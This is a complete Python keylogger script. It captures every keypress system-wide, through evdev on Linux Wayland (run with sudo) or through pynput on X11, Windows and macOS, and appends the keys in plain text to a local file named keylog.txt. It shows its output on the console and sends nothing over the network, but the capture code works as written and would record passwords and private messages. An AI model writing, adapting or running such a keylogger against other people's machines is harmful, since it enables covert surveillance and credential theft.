import platform
import os
import sys
from datetime import datetime

LOG_FILE = "keylog.txt"
WAYLAND_KEYBOARD_DEVICE = '/dev/input/event3'

def log_to_file(message):
    """Writes a message to the log file."""
    with open(LOG_FILE, "a") as f:
        f.write(message)

def run_evdev_mode():
    """Logic for Linux Wayland (Arch default) using evdev"""
    print(f"[*] Mode: WAYLAND (Kernel Level). Trying to hook {WAYLAND_KEYBOARD_DEVICE}...")

    try:
        import evdev
    except ImportError:
        print("\n[!] ERROR: 'evdev' library missing.")
        print("    Run: sudo pacman -S python-evdev")
        return

    try:
        device = evdev.InputDevice(WAYLAND_KEYBOARD_DEVICE)
        print(f"[*] Success! Listening on: {device.name}")
        print("[*] Press CTRL+C to stop.")

        log_to_file(f"\n--- Started evdev logging on {device.name} at {datetime.now()} ---\n")

        for event in device.read_loop():
            if event.type == evdev.ecodes.EV_KEY:
                data = evdev.categorize(event)
                if data.keystate == 1:
                    msg = f"{data.keycode}"
                    print(msg)
                    log_to_file(msg + "\n")

    except FileNotFoundError:
        print(f"\n[!] ERROR: Device '{WAYLAND_KEYBOARD_DEVICE}' not found.")
        print("    Run 'sudo ls /dev/input/' to see available devices.")
    except PermissionError:
        print(f"\n[!] ERROR: Permission denied accessing {WAYLAND_KEYBOARD_DEVICE}.")
        print("    YOU MUST RUN THIS SCRIPT WITH 'sudo' ON ARCH.")

def run_pynput_mode():
    """Logic for X11 / Windows / macOS using pynput"""
    print("[*] Mode: STANDARD (X11/Windows). Hooking global input...")

    try:
        from pynput.keyboard import Key, Listener
    except ImportError:
        print("\n[!] ERROR: 'pynput' library missing.")
        print("    Run: pip install pynput")
        return

    log_to_file(f"\n--- Started pynput logging at {datetime.now()} ---\n")

    def on_press(key):
        try:
            k = key.char
        except AttributeError:
            k = str(key)

        msg = f"{k}"
        print(msg, flush=True)
        log_to_file(msg + "\n")

    def on_release(key):
        if key == Key.esc:
            print("\n[*] ESC pressed. Stopping...")
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def main():
    os_name = platform.system()

    is_wayland = False
    if os_name == "Linux":
        if "WAYLAND_DISPLAY" in os.environ:
            is_wayland = True
        elif os.environ.get("XDG_SESSION_TYPE") == "wayland":
            is_wayland = True

    print("="*50)
    print(f" OS Detected       : {os_name}")
    print(f" Wayland Detected  : {is_wayland}")
    print("="*50)

    if os_name == "Linux" and is_wayland:
        run_evdev_mode()
    else:
        run_pynput_mode()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Script terminated by user.")
